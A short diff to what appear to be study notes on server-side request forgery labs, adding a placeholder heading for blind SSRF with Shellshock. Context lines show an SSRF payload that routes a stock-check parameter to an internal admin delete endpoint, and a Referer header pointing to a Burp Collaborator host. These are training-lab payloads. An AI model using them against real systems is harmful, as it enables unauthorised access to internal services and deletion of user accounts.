@@ -50,3 +50,6 @@ stockApi=/product/nextProduct?path%3dhttp://192.168.0.12:8080/admin/delete?usern
 ```
 Referer: http://burpcollaborator.net
 ```
+
+### Blind SSRF with Shellshock exploitation
+TODO: Expert
